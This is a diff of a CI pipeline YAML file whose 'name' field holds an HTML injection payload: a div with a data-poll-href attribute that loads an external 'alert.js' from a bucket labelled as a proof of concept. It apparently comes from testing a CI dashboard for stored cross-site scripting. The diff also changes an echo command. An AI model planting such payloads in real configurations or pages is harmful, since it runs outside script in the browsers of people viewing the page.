@@ -1,8 +1,9 @@
 version: v1.0
-name: Test<div data-poll-href='https://storage.googleapis.com/c53_poc/alert.js?v=2'></div>
+name: 'Test<div data-poll-href=''https://storage.googleapis.com/c53_poc/alert.js?v=2''></div>'
 agent:
   machine:
     type: s1-kubernetes
+    os_image: ''
 blocks:
   - name: Build & Test
     task:
@@ -11,7 +12,7 @@ blocks:
           commands:
             - checkout
             - ls -lia
-            - echo "2"
+            - echo "3"
             - test-results publish report.xml
 after_pipeline:
   task:
